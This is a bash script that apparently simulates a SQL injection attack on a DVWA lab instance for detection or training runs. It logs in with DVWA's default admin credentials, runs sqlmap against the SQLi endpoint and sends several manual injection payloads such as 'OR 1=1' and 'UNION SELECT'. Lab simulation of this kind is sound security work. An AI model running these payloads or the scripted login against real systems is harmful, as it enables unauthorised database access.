#!/bin/bash
set -eu

RUN_ID="${1:-no-run-id}"
TARGET_IP="${TARGET_IP:-192.168.50.10}"
SESSION_FILE="/tmp/dvwa_sqli_${RUN_ID}.txt"

echo "[run_id=$RUN_ID] SQL injection simulation starting target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# Establish authenticated DVWA session
curl -s -c "$SESSION_FILE" -b "" \
  -X POST "http://$TARGET_IP/dvwa/login.php" \
  -d "username=admin&password=password&Login=Login" -L -o /dev/null || true

# Extract session ID for sqlmap
PHPSESSID=$(awk '/PHPSESSID/{print $NF}' "$SESSION_FILE" 2>/dev/null || echo "nosession")

# sqlmap against DVWA SQLi endpoint
sqlmap -u "http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "PHPSESSID=$PHPSESSID;security=low" \
  --batch --level=1 --risk=1 --timeout=5 --retries=1 2>/dev/null || true

# Manual SQLi payloads against DVWA sqli endpoint
curl -s -b "$SESSION_FILE" \
  "http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=1+OR+1%3D1--+&Submit=Submit" -o /dev/null || true
curl -s -b "$SESSION_FILE" \
  "http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=1'+AND+'1'%3D'1&Submit=Submit" -o /dev/null || true
curl -s -b "$SESSION_FILE" \
  "http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+null%2Cnull--&Submit=Submit" -o /dev/null || true
curl -s -b "$SESSION_FILE" \
  "http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit" -o /dev/null || true

rm -f "$SESSION_FILE" || true
echo "[run_id=$RUN_ID] SQL injection simulation done target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"